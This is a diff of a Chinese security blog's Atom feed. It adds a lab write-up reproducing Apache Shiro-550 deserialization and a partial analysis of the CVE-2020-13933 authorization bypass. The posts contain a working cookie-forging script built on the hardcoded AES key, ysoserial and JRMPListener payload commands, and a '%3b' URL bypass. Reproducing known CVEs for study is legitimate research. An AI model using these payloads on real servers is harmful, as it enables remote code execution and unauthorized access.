@@ -1,15 +1,386 @@
 <?xml version="1.0" encoding="utf-8"?>
 <feed xmlns="http://www.w3.org/2005/Atom">
     <id>https://f4de-bak.github.io</id>
-    <title>F4DE的博客</title>
-    <updated>2021-03-22T09:33:22.582Z</updated>
+    <title>星海</title>
+    <updated>2021-03-25T12:01:43.589Z</updated>
     <generator>https://github.com/jpmonette/feed</generator>
     <link rel="alternate" href="https://f4de-bak.github.io"/>
     <link rel="self" href="https://f4de-bak.github.io/atom.xml"/>
     <subtitle>Keep fantasy</subtitle>
     <logo>https://f4de-bak.github.io/images/avatar.png</logo>
     <icon>https://f4de-bak.github.io/favicon.ico</icon>
-    <rights>All rights reserved 2021, F4DE的博客</rights>
+    <rights>All rights reserved 2021, 星海</rights>
+    <entry>
+        <title type="html"><![CDATA[Shiro复盘--反序列化]]></title>
+        <id>https://f4de-bak.github.io/post/HrbS11Jsa/</id>
+        <link href="https://f4de-bak.github.io/post/HrbS11Jsa/">
+        </link>
+        <updated>2021-03-25T11:50:02.000Z</updated>
+        <summary type="html"><![CDATA[<p>Shiro漏洞复盘系列--1.2.4版本产生的反序列化安全问题。（Shiro-550）</p>
+]]></summary>
+        <content type="html"><![CDATA[<p>Shiro漏洞复盘系列--1.2.4版本产生的反序列化安全问题。（Shiro-550）</p>
+<!-- more -->
+<h1 id="介绍">介绍</h1>
+<p>Shiro对于RememberMe Cookie的处理方式如下：</p>
+<figure data-type="image" tabindex="1"><img src="https://image-1302577725.cos.ap-beijing.myqcloud.com/img/20210324232800.png" alt="image-20210324232800002" loading="lazy"></figure>
+<ul>
+<li>检索该Cookie的值</li>
+<li>Base64解码</li>
+<li>AES解密</li>
+<li>使用Java中原生的<code>ObjectInputStream</code>反序列化</li>
+</ul>
+<p>Shiro1.2.4版本及以下的AES的key是硬编码在其中的，<code>org.apache.shiro.mgt.AbsetractRememberMeManager</code>：</p>
+<figure data-type="image" tabindex="2"><img src="https://image-1302577725.cos.ap-beijing.myqcloud.com/img/20210325195133.png" alt="image-20210324233334049" loading="lazy"></figure>
+<p>解密AES算法还需要两个要素：</p>
+<ul>
+<li>mode（加解密算法）</li>
+<li>IV（初始化向量）</li>
+</ul>
+<p>如果可以再确定以上两者，则可以通过构造Cookie的值从而触发反序列化Gadget（Shiro-550）。</p>
+<h1 id="环境搭建">环境搭建</h1>
+<p>下载Shiro1.2.4版本：</p>
+<pre><code class="language-bash">git clone https://github.com/apache/shiro.git  
+cd shiro
+git checkout shiro-root-1.2.4
+</code></pre>
+<p>编辑<code>shiro\samples\web\pom.xml</code>文件，修改<code>jtsl</code>版本为1.2并且加入<code>commons-collections4</code>依赖：</p>
+<ul>
+<li><code>jstl</code>是为了正确识别JSP标签</li>
+<li><code>commons-collections4</code>是为了方便后续漏洞复现</li>
+</ul>
+<pre><code class="language-xml">&lt;dependency&gt;
+    &lt;groupId&gt;javax.servlet&lt;/groupId&gt;
+    &lt;artifactId&gt;jstl&lt;/artifactId&gt;
+    &lt;version&gt;1.2&lt;/version&gt; 
+    &lt;scope&gt;runtime&lt;/scope&gt;
+&lt;/dependency&gt;
+
+&lt;dependency&gt;
+    &lt;groupId&gt;org.apache.commons&lt;/groupId&gt;
+    &lt;artifactId&gt;commons-collections4&lt;/artifactId&gt;
+    &lt;version&gt;4.0&lt;/version&gt;
+&lt;/dependency&gt;
+</code></pre>
+<p>用IDEA导入<code>shiro\samples\web\pom.xml</code>项目，然后等待依赖下载，然后执行<code>mvn install</code>，如果出现以下错误，则需要额外在你的<code>./m2</code>文件夹下创建<code>toolchains.xml</code>，然后写入以下内容：</p>
+<figure data-type="image" tabindex="3"><img src="https://image-1302577725.cos.ap-beijing.myqcloud.com/img/20210325192945.png" alt="image-20210325192945203" loading="lazy"></figure>
+<pre><code class="language-xml">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;
+
+&lt;toolchains xmlns=&quot;http://maven.apache.org/TOOLCHAINS/1.1.0&quot; xmlns:xsi=&quot;http://www.w3.org/2001/XMLSchema-instance&quot;
+  xsi:schemaLocation=&quot;http://maven.apache.org/TOOLCHAINS/1.1.0 http://maven.apache.org/xsd/toolchains-1.1.0.xsd&quot;&gt;
+
+&lt;!--插入下面代码--&gt;
+  &lt;toolchain&gt;
+    &lt;type&gt;jdk&lt;/type&gt;
+    &lt;provides&gt;
+      &lt;version&gt;1.6&lt;/version&gt;
+      &lt;vendor&gt;sun&lt;/vendor&gt;
+    &lt;/provides&gt;
+    &lt;configuration&gt;
+        &lt;!--这里是你安装jdk的文件目录--&gt;
+      &lt;jdkHome&gt;{Your_Path}/1.6.0.jdk/&lt;/jdkHome&gt;
+    &lt;/configuration&gt;
+  &lt;/toolchain&gt;
+&lt;/toolchains&gt;
+</code></pre>
+<p>之后就是添加Tomcat并且配置<code>Artifact</code>，不再赘述，环境搭建成功之后的页面：</p>
+<figure data-type="image" tabindex="4"><img src="https://image-1302577725.cos.ap-beijing.myqcloud.com/img/20210325193632.png" alt="image-20210325193632795" loading="lazy"></figure>
+<h1 id="调试分析">调试分析</h1>
+<h2 id="序列化加密过程">序列化加密过程</h2>
+<p>登录时勾选<code>Remember Me</code>：</p>
+<figure data-type="image" tabindex="5"><img src="https://image-1302577725.cos.ap-beijing.myqcloud.com/img/20210325193814.png" alt="image-20210325193813966" loading="lazy"></figure>
+<p>登录成功后就会在Cookie中发现<code>rememberMe</code>字段：</p>
+<figure data-type="image" tabindex="6"><img src="https://image-1302577725.cos.ap-beijing.myqcloud.com/img/20210325193934.png" alt="image-20210325193934623" loading="lazy"></figure>
+<p>在<code>org.apache.shiro.mgt.AbstractRememberMeManager#onSuccessfulLogin</code>打下断点，发送登录请求，开始调试：</p>
+<img src="https://image-1302577725.cos.ap-beijing.myqcloud.com/img/20210325000957.png" alt="image-20210325000957209" style="zoom: 80%;" />
+<figure data-type="image" tabindex="7"><img src="https://image-1302577725.cos.ap-beijing.myqcloud.com/img/20210325000822.png" alt="image-20210325000822124" loading="lazy"></figure>
+<p>如果勾选了RememberMe功能，则会进入<code>remembertIdentity</code>方法中：</p>
+<figure data-type="image" tabindex="8"><img src="https://image-1302577725.cos.ap-beijing.myqcloud.com/img/20210325001716.png" alt="image-20210325001716672" loading="lazy"></figure>
+<p><code>getIndentityToRemember</code>方法会将用户的身份信息封装成一个对象，之后传入<code>rememberIdentity</code>方法：</p>
+<figure data-type="image" tabindex="9"><img src="https://image-1302577725.cos.ap-beijing.myqcloud.com/img/20210325002021.png" alt="image-20210325002020908" loading="lazy"></figure>
+<p><code>convertPrincipalsToBytes</code>方法会将之前得到包含用户信息的对象转化成一个bytes数组类型的对象，我们跟入该方法：</p>
+<figure data-type="image" tabindex="10"><img src="https://image-1302577725.cos.ap-beijing.myqcloud.com/img/20210325002206.png" alt="image-20210325002206022" loading="lazy"></figure>
+<p>可以看到，先将<code>principals</code>对象进行序列化，之后再调用<code>encrypt</code>方法进行加密，先跟入<code>serialize</code>方法，可以看到Shiro是采用了Java中原生的<code>ObjectOutputStream#writeObject</code>方法进行序列化的，之后返回序列化信息的bytes数组对象：</p>
+<figure data-type="image" tabindex="11"><img src="https://image-1302577725.cos.ap-beijing.myqcloud.com/img/20210325002334.png" alt="image-20210325002334553" loading="lazy"></figure>
+<p>这个bytes数组对象会传入到<code>encrypt</code>方法中去，接着跟进<code>encrypt</code>方法：</p>
+<figure data-type="image" tabindex="12"><img src="https://image-1302577725.cos.ap-beijing.myqcloud.com/img/20210325003201.png" alt="image-20210325003201299" loading="lazy"></figure>
+<p>通过<code>getCipherService</code>方法可以获取到一个用于加密的<code>CipherService</code>接口对象，这个对象是在当前类的构造方法中就完成初始化了的：</p>
+<figure data-type="image" tabindex="13"><img src="https://image-1302577725.cos.ap-beijing.myqcloud.com/img/20210325003657.png" alt="image-20210325003657499" loading="lazy"></figure>
+<p><code>AesCipherService</code>间接实现了<code>CipherService</code>接口，并且如果再跟进的话，可以发现<code>AesCipherService</code>也是调用了父类的构造方法进行初始化，确定了加密方式以及mode：</p>
+<figure data-type="image" tabindex="14"><img src="https://image-1302577725.cos.ap-beijing.myqcloud.com/img/20210325004132.png" alt="image-20210325004132251" loading="lazy"></figure>
+<figure data-type="image" tabindex="15"><img src="https://image-1302577725.cos.ap-beijing.myqcloud.com/img/20210325004150.png" alt="image-20210325004150470" loading="lazy"></figure>
+<p>同样在Debug控制台也可以获取到对应的信息：</p>
+<figure data-type="image" tabindex="16"><img src="https://image-1302577725.cos.ap-beijing.myqcloud.com/img/20210325004253.png" alt="image-20210325004253589" loading="lazy"></figure>
+<p>回到<code>encrypt</code>方法中来，接着跟进<code>cipherService#encrypt</code>，这里传入的第一个参数就是序列化之后的bytes数组，第二个参数就是之前提到的硬编码的AES-Key：</p>
+<figure data-type="image" tabindex="17"><img src="https://image-1302577725.cos.ap-beijing.myqcloud.com/img/20210325004546.png" alt="image-20210325004546278" loading="lazy"></figure>
+<p>通过<code>generateInitializationVector</code>方法获取到的其实是一个长度为16的随机字节数组，一路跟入到<code>org.apache.shiro.crypto.JcaCipherService#generateInitializationVector</code>：</p>
+<figure data-type="image" tabindex="18"><img src="https://image-1302577725.cos.ap-beijing.myqcloud.com/img/20210325005140.png" alt="image-20210325005140075" loading="lazy"></figure>
+<p>通过<code>SecureRandom</code>来生成随机数，然后写入到长度为16的字节数组中，这个数组就是AES的初始化向量（IV），随后被传入<code>encrypt</code>方法中去：</p>
+<figure data-type="image" tabindex="19"><img src="https://image-1302577725.cos.ap-beijing.myqcloud.com/img/20210325005501.png" alt="image-20210325005501229" loading="lazy"></figure>
+<p><code>org.apache.shiro.crypto.JcaCipherService#encrypt</code>：</p>
+<figure data-type="image" tabindex="20"><img src="https://image-1302577725.cos.ap-beijing.myqcloud.com/img/20210325082245.png" alt="image-20210325082219984" loading="lazy"></figure>
+<p>在第324行中的<code>crypt</code>方法把序列化数据、AES-Key、IV、MODE传入方法，进行AES加密，之后再把十六字节的IV和加密后的密文<code>encrypted</code>进行数组的拼接：</p>
+<figure data-type="image" tabindex="21"><img src="https://image-1302577725.cos.ap-beijing.myqcloud.com/img/20210325082500.png" alt="image-20210325082500537" loading="lazy"></figure>
+<p>最后一路返回到<code>org.apache.shiro.mgt.AbstractRememberMeManager#encrypt</code>方法中，经上面分析可知，最好加密的结果为<code>十六字节的IV</code> + <code>AES密文</code>：</p>
+<figure data-type="image" tabindex="22"><img src="https://image-1302577725.cos.ap-beijing.myqcloud.com/img/20210325082743.png" alt="image-20210325082743615" loading="lazy"></figure>
+<p>再返回到<code>remembertIdentity</code>方法中，将加密完成后的整段密文传入<code>rememberSerializedIdentity</code>方法中：</p>
+<figure data-type="image" tabindex="23"><img src="https://image-1302577725.cos.ap-beijing.myqcloud.com/img/20210325083414.png" alt="image-20210325083414344" loading="lazy"></figure>
+<p>跟入<code>rememberSerializedIdentity</code>方法中，会把Base64编码之后的密文放入Cookie中：</p>
+<figure data-type="image" tabindex="24"><img src="https://image-1302577725.cos.ap-beijing.myqcloud.com/img/20210325083506.png" alt="image-20210325083506860" loading="lazy"></figure>
+<h2 id="反序列化解密过程">反序列化解密过程</h2>
+<p>发送只有RememberMe Cookie的请求，在<code>org.apache.shiro.mgt.DefaultSecurityManager#getRememberedIdentity</code>方法中打下断点：</p>
+<figure data-type="image" tabindex="25"><img src="https://image-1302577725.cos.ap-beijing.myqcloud.com/img/20210325093936.png" alt="image-20210325093936498" loading="lazy"></figure>
+<p>Cookie等信息都封装在<code>subjectContext</code>对象之中，跟入<code>rmm.getRememberedPrincipals</code>方法：</p>
+<figure data-type="image" tabindex="26"><img src="https://image-1302577725.cos.ap-beijing.myqcloud.com/img/20210325094251.png" alt="image-20210325094251283" loading="lazy"></figure>
+<p>接着跟入<code>getRememberedSerializedIdentity</code>方法，在这个方法中会把请求中携带的Cookie信息提取出来进行Base64解码，然后返回解码之后的bytes数组对象：</p>
+<figure data-type="image" tabindex="27"><img src="https://image-1302577725.cos.ap-beijing.myqcloud.com/img/20210325094521.png" alt="image-20210325094521328" loading="lazy"></figure>
+<p>返回之后回到<code>getRememberedPrincipals</code>方法中，接着跟入<code>convertBytesToPrincipals</code>方法，这个方法中会把上一步得到的bytes数组进行解密，然后进行反序列化：</p>
+<figure data-type="image" tabindex="28"><img src="https://image-1302577725.cos.ap-beijing.myqcloud.com/img/20210325094659.png" alt="image-20210325094659443" loading="lazy"></figure>
+<p>跟入<code>decrypt</code>方法，整个流程就类似与序列化加密的过程，在获取到解密对象之后把加密的bytes数组和硬编码的AES-Key进行解密：</p>
+<figure data-type="image" tabindex="29"><img src="https://image-1302577725.cos.ap-beijing.myqcloud.com/img/20210325094833.png" alt="image-20210325094833446" loading="lazy"></figure>
+<p>跟入<code>cipherService.decrypt</code>方法，这个方法中会把前十六位的IV提取出来，之后用AES-Key进行解密：</p>
+<figure data-type="image" tabindex="30"><img src="https://image-1302577725.cos.ap-beijing.myqcloud.com/img/20210325095013.png" alt="image-20210325095013104" loading="lazy"></figure>
+<p>解密之后的数据回到<code>convertBytesToPrincipals</code>方法中，传入<code>deserialize</code>方法：</p>
+<figure data-type="image" tabindex="31"><img src="https://image-1302577725.cos.ap-beijing.myqcloud.com/img/20210325095126.png" alt="image-20210325095126639" loading="lazy"></figure>
+<p>跟入该方法，可以发现采用了原生<code>ObjectInputStream#readObject</code>方法来进行反序列化数据：</p>
+<figure data-type="image" tabindex="32"><img src="https://image-1302577725.cos.ap-beijing.myqcloud.com/img/20210325095345.png" alt="image-20210325095345775" loading="lazy"></figure>
+<h2 id="aes-cbc安全性">AES-CBC安全性</h2>
+<h3 id="cookie解密">Cookie解密</h3>
+<p>由<a href="https://www.jianshu.com/p/45848dd484a9">关于AES加解密中CBC模式的IV初始化向量的安全性问题</a>这篇文章可以认识到，CBC解密的时候如果IV向量错误，只会影响第一个块的数据解密结果，而之后其他块的IV则是上一个块的加密数据。</p>
+<p>在Shiro的RememberMe数据的第一个块就是IV向量，所以使用一个错误的IV向量来对Cookie进行解密，只会让正确的IV的解密错误，而不影响真正数据的解密结果。</p>
+<pre><code class="language-python"># python2
+import sys
+import base64
+from Crypto.Cipher import AES
+
+key = &quot;kPH+bIxk5D2deZiIxcaaaA==&quot;
+MODE = AES.MODE_CBC
+IV = b' ' * 16
+encryptor = AES.new(base64.b64decode(key), MODE, IV)
+# cookie = &quot;Cug6rRUP6+Nxy/zupy8zen+Npa0r/TCD5Cy40XjwlKsVUp91QqDOrGnt7KNbkUZPCG8+s780xNbX3qsy92Kjwv9RoDpZlrnbE7yBAL70bl5q0nShc/CmJeNbP/9ybToxM1cvY4UCpaLKwdourjzxCr6EvjFjtuAunpsRBBThSjIPKS6qyZj08ZY95LDA0WdSnRrDx/rCw12YgskcUIlstpPc7MPLRVjSWJ1ghIg7lXXVDLt0GeoGhsYp0kX2aANjOi3bfFv73Wuj49f5OxnLE3LrMskRI+GsynCjmZJLKb88Sjz7nByIMhZwvoCc6fmEZQyjOgnJFGlps3T+FfLkTcyoE1kvCNFfGnBLlX7TVbjo0ySB7k+6vYaQHny2yv1gZ8DyUq3+wbiIleI/RjDoHP07yiCRJHWT23/4AoYSyQAMAauW2E6Fw2/Mu+Ac3/qWLZ7LNOetqargbLwBbKc3uJJoG9Kb4KwjRjj7jmKh4GIIcRk5CujpBaiOKHfOIM/S&quot;
+print encryptor.decrypt(base64.b64decode(sys.argv[1]))
+</code></pre>
+<figure data-type="image" tabindex="33"><img src="https://image-1302577725.cos.ap-beijing.myqcloud.com/img/20210325102536.png" alt="image-20210325102536864" loading="lazy"></figure>
+<h3 id="cookie伪造">Cookie伪造</h3>
+<p>同理，在Cookie伪造的时候使用随机十六位IV就可以：</p>
+<pre><code class="language-python"># python2
+import sys
+import base64
+import uuid
+from Crypto.Cipher import AES
+
+key = &quot;kPH+bIxk5D2deZiIxcaaaA==&quot;
+mode = AES.MODE_CBC
+IV = uuid.uuid4().bytes
+encryptor = AES.new(base64.b64decode(key), mode, IV)
+
+payload = base64.b64decode(sys.argv[1])
+BS = AES.block_size
+pad = lambda s: s + ((BS - len(s) % BS) * chr(BS - len(s) % BS)).encode()
+payload = pad(payload)
+
+print(base64.b64encode(IV + encryptor.encrypt(payload)))
+</code></pre>
+<h1 id="测试gadget">测试Gadget</h1>
+<h2 id="urldns">URLDNS</h2>
+<p>URLDNS这条Gadget不需要其他依赖支持，一般用来测试target是否存在反序列化漏洞。</p>
+<p>使用ysoserial生成序列化数据：</p>
+<pre><code class="language-bash">java -jar ysoserial-0.0.6-SNAPSHOT-all.jar URLDNS &quot;http://b8ftn5.dnslog.cn&quot; |base64 |sed ':label;N;s/\n//;b label'
+</code></pre>
+<figure data-type="image" tabindex="34"><img src="https://image-1302577725.cos.ap-beijing.myqcloud.com/img/20210325112120.png" alt="image-20210325112112935" loading="lazy"></figure>
+<p>再使用Cookie伪造脚本进行伪造：</p>
+<figure data-type="image" tabindex="35"><img src="https://image-1302577725.cos.ap-beijing.myqcloud.com/img/20210325112215.png" alt="image-20210325112215534" loading="lazy"></figure>
+<p>然后发送Cookie：</p>
+<figure data-type="image" tabindex="36"><img src="https://image-1302577725.cos.ap-beijing.myqcloud.com/img/20210325112304.png" alt="image-20210325112304118" loading="lazy"></figure>
+<figure data-type="image" tabindex="37"><img src="https://image-1302577725.cos.ap-beijing.myqcloud.com/img/20210325112324.png" alt="image-20210325112324441" loading="lazy"></figure>
+<p>收到了DNS查询请求，URLDNS Gadget验证成功，确实存在Java反序列化漏洞。</p>
+<h2 id="cc2">CC2</h2>
+<p>为了方便复现，之前本地添加了<code>commons-collections4</code>的依赖，而CC2这条Gadget完全依赖于<code>commons-collections4</code>，所以可以用CC2生成payload来测试，本地环境如下：</p>
+<ul>
+<li>JDK 8u281</li>
+<li>Tomcat 9.0.44</li>
+</ul>
+<p>生成序列化数据：</p>
+<pre><code class="language-bash">java -jar ysoserial-0.0.6-SNAPSHOT-all.jar CommonsCollections2 &quot;calc&quot; |base64 |sed ':label;N;s/\n//;b label'
+</code></pre>
+<figure data-type="image" tabindex="38"><img src="https://image-1302577725.cos.ap-beijing.myqcloud.com/img/20210325124659.png" alt="image-20210325124659250" loading="lazy"></figure>
+<p>伪造Cookie：</p>
+<figure data-type="image" tabindex="39"><img src="https://image-1302577725.cos.ap-beijing.myqcloud.com/img/20210325124718.png" alt="image-20210325124718251" loading="lazy"></figure>
+<p>发送请求：</p>
+<figure data-type="image" tabindex="40"><img src="https://image-1302577725.cos.ap-beijing.myqcloud.com/img/20210325124903.gif" alt="1" loading="lazy"></figure>
+<h2 id="jrmp">JRMP</h2>
+<p>使用<code>mvn dependency:list</code>命令可以查看Shiro中的依赖项，可以发现有<code>commons-collections 3.2.1</code>的依赖：</p>
+<figure data-type="image" tabindex="41"><img src="https://image-1302577725.cos.ap-beijing.myqcloud.com/img/20210325145735.png" alt="image-20210325145735900" loading="lazy"></figure>
+<p>但是尝试直接用ysoserial中的CC6这条Gadget生成的payload直接打的话并不能成功，而是会产生以下错误：</p>
+<figure data-type="image" tabindex="42"><img src="https://image-1302577725.cos.ap-beijing.myqcloud.com/img/20210325145703.png" alt="image-20210325145703717" loading="lazy"></figure>
+<p>参考<a href="https://bling.kapsi.fi/blog/jvm-deserialization-broken-classldr.html">Go low – Exploiting JVM deserialization vulns despite a broken class loader (kapsi.fi)</a>可知Shiro使用的ClassLoader不允许加载任何数组类型的对象，但是ysoserial中大多数的Gadget都依赖于下面两个类：</p>
+<ul>
+<li>
+<p>ChainedTransformer：内部有一个数组类型的对象<code>iTransformers</code>，用于进行链式调用。</p>
+<figure data-type="image" tabindex="43"><img src="https://image-1302577725.cos.ap-beijing.myqcloud.com/img/20210325150836.png" alt="image-20210325150836245" loading="lazy"></figure>
+</li>
+<li>
+<p>InvokerTransformer：内部传递给待调用的方法的参数是一个数组，但是如果方法的参数为空，则不影响使用。</p>
+<figure data-type="image" tabindex="44"><img src="https://image-1302577725.cos.ap-beijing.myqcloud.com/img/20210325151327.png" alt="image-20210325151327388" loading="lazy"></figure>
+</li>
+</ul>
+<p>解决这个问题的方法是使用JRMP，在VPS上执行下面的命令，监听端口，这里先用CC2 Gadget来测试：</p>
+<pre><code class="language-bash">java -cp ysoserial-0.0.6-SNAPSHOT-all.jar ysoserial.exploit.JRMPListener 12345 CommonsCollections2 'calc'
+</code></pre>
+<p>使用ysoserial生成序列化数据，并伪造Cookie：</p>
+<pre><code class="language-bash">java -jar ysoserial-0.0.6-SNAPSHOT-all.jar JRMPClient &quot;{VPS_IP}:12345&quot;|base64 |sed ':label;N;s/\n//;b label'
+···
+py -2 AES-en.py {$ser_data}
+</code></pre>
+<p>本地使用JDK8u281测试JRMP失败，于是我换成了JDK1.7，同时由于Tomcat9不支持Java7，所以更换为Tomcat8：</p>
+<ul>
+<li>JDK 1.7</li>
+<li>Tomcat 8.5.64</li>
+</ul>
+<figure data-type="image" tabindex="45"><img src="https://image-1302577725.cos.ap-beijing.myqcloud.com/img/20210325163717.png" alt="image-20210325163717040" loading="lazy"></figure>
+<p>发送含有伪造的Cookie的请求，测试成功：</p>
+<figure data-type="image" tabindex="46"><img src="https://image-1302577725.cos.ap-beijing.myqcloud.com/img/20210325163905.png" alt="image-20210325163905782" loading="lazy"></figure>
+<p>因为我们之前手动添加了<code>commons-collections4</code>的依赖，所以这里使用CC2 Gadget可以成功执行命令，但是如果换成CC6 Gadget，虽然我们之前提到Shiro中含有<code>commons-collections 3.2.1</code>的依赖，但是本地测试并没有成功执行命令：</p>
+<pre><code class="language-bash">java -cp ysoserial-0.0.6-SNAPSHOT-all.jar ysoserial.exploit.JRMPListener 12345 CommonsCollections6 &quot;calc&quot;
+</code></pre>
+<p>参考李三师傅的文章[shiro 反序列化复现 - 李三的剑谱 (redteam.today)](http://redteam.today/2019/09/20/shiro 反序列化复现/)可以知道，Shiro中的<code>commons-collections 3.2.1</code>依赖为<code>test</code>，而打包成<code>war</code>包的时候只会把<code>compile</code>和<code>runtime</code>的依赖打包，而<code>test</code>的依赖是在开发阶段使用的，也就是说实际运行环境中并没有<code>commons-collections 3.2.1</code>的依赖，原文如下：</p>
+<blockquote>
+<p>然而本地测试的时候并未复现中，应该是gadget的问题，因为在加了commons-conllections4.0的环境用ysoserial的CommonsCollections2就可以成功。难道是环境没装好？</p>
+<p><strong>后来仔细看了一下，确实是环境的问题，具体原因是打包成war的时候只会把compile和runtime的打包，而test的属于开发阶段需要使用的，从而不会打进去，而这里common-conllectons恰好属于test。所以生成环境中根本没有common-conllectons，因此是不可能打成功的</strong>。</p>
+</blockquote>
+<p>所以我们手动添加<code>commons-collections 3.2.1</code>的依赖，让其为<code>compile</code>：</p>
+<pre><code class="language-xml">        &lt;dependency&gt;
+            &lt;groupId&gt;commons-collections&lt;/groupId&gt;
+            &lt;artifactId&gt;commons-collections&lt;/artifactId&gt;
+            &lt;version&gt;3.2.1&lt;/version&gt;
+        &lt;/dependency&gt;
+</code></pre>
+<p>然后再次测试：</p>
+<pre><code class="language-bash">mvn clean install
+······
+java -jar ysoserial-0.0.6-SNAPSHOT-all.jar JRMPClient &quot;{VPS_IP}:12345&quot;|base64 |sed ':label;N;s/\n//;b label'
+py -2 AES-en.py {$ser_data}
+······
+java -cp ysoserial-0.0.6-SNAPSHOT-all.jar ysoserial.exploit.JRMPListener 12345 CommonsCollections6 &quot;calc&quot;
+</code></pre>
+<figure data-type="image" tabindex="47"><img src="https://image-1302577725.cos.ap-beijing.myqcloud.com/img/20210325170753.gif" alt="1" loading="lazy"></figure>
+<p>再手动添加了<code>commons-collections 3.2.1</code>依赖之后，这次测试成功了，所以我认为<strong>原生的Shiro并没有一个可以完整执行命令的Gadget，而是只有一个可以反序列化的点。</strong></p>
+<blockquote>
+<p>正如李三师傅所说：</p>
+<p><strong>纯原生的shiro只是一个反序列化的触发点，没有完整gadget。因此需要结合其它依赖shiro的项目才有可能达到RCE的效果（比如jeecms）</strong></p>
+</blockquote>
+<h1 id="reference">Reference</h1>
+<p>感谢几位师傅详尽的分析文章，让我这个菜鸡少踩了一些坑：</p>
+<p>笑师傅：<a href="https://l3yx.github.io/2020/03/21/Shiro-1-2-4-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/#%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8">Shiro 1.2.4 反序列化漏洞 | l3yx's blog</a></p>
+<p>李三师傅：[shiro 反序列化复现 - 李三的剑谱 (redteam.today)](http://redteam.today/2019/09/20/shiro 反序列化复现/)</p>
+<p><a href="https://joychou.org/java/apache-shiro-java-deserialize-vulnerability.html#directory0592593546308368510">Apache Shiro Java反序列化漏洞分析 - 贫民窟的艺术家 (joychou.org)</a></p>
+<p><a href="https://bling.kapsi.fi/blog/jvm-deserialization-broken-classldr.html">Go low – Exploiting JVM deserialization vulns despite a broken class loader (kapsi.fi)</a></p>
+<p><a href="https://www.jianshu.com/p/45848dd484a9">关于AES加解密中CBC模式的IV初始化向量的安全性问题 - 简书 (jianshu.com)</a></p>
+<p>https://issues.apache.org/jira/browse/SHIRO-550</p>
+]]></content>
+    </entry>
+    <entry>
+        <title type="html"><![CDATA[Shiro复盘--权限绕过（四）]]></title>
+        <id>https://f4de-bak.github.io/post/qUm02XAyG/</id>
+        <link href="https://f4de-bak.github.io/post/qUm02XAyG/">
+        </link>
+        <updated>2021-03-22T13:50:56.000Z</updated>
+        <summary type="html"><![CDATA[<p>Shiro漏洞复盘系列--1.6.0版本以下的权限绕过复现分析。（CVE-2020-13933）</p>
+]]></summary>
+        <content type="html"><![CDATA[<p>Shiro漏洞复盘系列--1.6.0版本以下的权限绕过复现分析。（CVE-2020-13933）</p>
+<!-- more -->
+<h1 id="简介">简介</h1>
+<p>影响版本：shiro &lt; 1.6.0</p>
+<p>限制条件：</p>
+<ul>
+<li>Spring 匹配非固定路由，比如<code>/admin/{name}</code></li>
+</ul>
+<h1 id="配置">配置</h1>
+<pre><code class="language-xml">&lt;parent&gt;
+ &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt;
+ &lt;artifactId&gt;spring-boot-starter-parent&lt;/artifactId&gt;
+ &lt;version&gt;2.2.6.RELEASE&lt;/version&gt;
+ &lt;relativePath/&gt; &lt;!-- lookup parent from repository --&gt;
+&lt;/parent&gt;
+&lt;dependency&gt;
+ &lt;groupId&gt;org.apache.shiro&lt;/groupId&gt;
+ &lt;artifactId&gt;shiro-web&lt;/artifactId&gt;
+ &lt;version&gt;1.5.3&lt;/version&gt;
+&lt;/dependency&gt;
+</code></pre>
+<pre><code class="language-java">    @Bean
+    ShiroFilterFactoryBean shiroFilterFactoryBean() {
+        ShiroFilterFactoryBean bean = new ShiroFilterFactoryBean();
+        bean.setSecurityManager(securityManager());
+        // 配置认证权限
+        bean.setLoginUrl(&quot;/login&quot;);
+        HashMap&lt;String, String&gt; map = new HashMap&lt;&gt;();
+        map.put(&quot;/login&quot;, &quot;anon&quot;);
+        map.put(&quot;/user&quot;, &quot;anon&quot;);
+        map.put(&quot;/admin/*&quot;, &quot;authc&quot;);
+        bean.setFilterChainDefinitionMap(map);
+        return bean;
+    }
+
+
+    @ResponseBody
+    @RequestMapping(&quot;/admin/{name}&quot;)
+    public String admin(String name) {
+        return &quot;hello admin&quot;;
+    }
+</code></pre>
+<h1 id="分析">分析</h1>
+<p>正常访问<code>/admin/auth</code>，被shiro拦截：</p>
+<figure data-type="image" tabindex="1"><img src="https://image-1302577725.cos.ap-beijing.myqcloud.com/img/20210322235122.png" alt="image-20210322235122836" loading="lazy"></figure>
+<p>访问<code>/admin/%3bauth</code>，绕过shiro拦截：</p>
+<figure data-type="image" tabindex="2"><img src="https://image-1302577725.cos.ap-beijing.myqcloud.com/img/20210322235210.png" alt="image-20210322235210614" loading="lazy"></figure>
+<h2 id="shiro">shiro</h2>
+<p>来看shiro对于URL处理的部分，跟入<code>getServletPath</code>：</p>
+<figure data-type="image" tabindex="3"><img src="https://image-1302577725.cos.ap-beijing.myqcloud.com/img/20210322235759.png" alt="image-20210322235758954" loading="lazy"></figure>
+<p>URL会先被URLdecode一次：</p>
+<figure data-type="image" tabindex="4"><img src="https://image-1302577725.cos.ap-beijing.myqcloud.com/img/20210323000407.png" alt="image-20210323000407759" loading="lazy"></figure>
+<p><code>%3b --&gt; ;</code>，然后进入shiro的<code>;</code>号截断过程：</p>
+<figure data-type="image" tabindex="5"><img src="https://image-1302577725.cos.ap-beijing.myqcloud.com/img/20210323000522.png" alt="image-20210323000522704" loading="lazy"></figure>
+<p>之后会判断处理的结果是否以<code>/</code>结尾，如是，则去之：</p>
+<figure data-type="image" tabindex="6"><img src="https://image-1302577725.cos.ap-beijing.myqcloud.com/img/20210323000703.png" alt="image-20210323000703735" loading="lazy"></figure>
+<p>之后会进入URL和pattern的匹配逻辑中：</p>
+<figure data-type="image" tabindex="7"><img src="https://image-1302577725.cos.ap-beijing.myqcloud.com/img/20210323000931.png" alt="image-20210323000931573" loading="lazy"></figure>
+<p><code>/admin/*</code>无法匹配<code>/amdin</code>，所以就导致了shiro的权限绕过：</p>
+<figure data-type="image" tabindex="8"><img src="https://image-1302577725.cos.ap-beijing.myqcloud.com/img/20210323104331.png" alt="image-20210323104331242" loading="lazy"></figure>
+<h2 id="spring">Spring</h2>
+<p>来到Spring的部分，<code>org.springframework.web.util.UrlPathHelper#getLookupPathForRequest</code>：</p>
+<figure data-type="image" tabindex="9"><img src="https://image-1302577725.cos.ap-beijing.myqcloud.com/img/20210323112848.png" alt="image-20210323112848660" loading="lazy"></figure>
+<p>跟进<code>getPathWithinServletMapping</code>方法：</p>
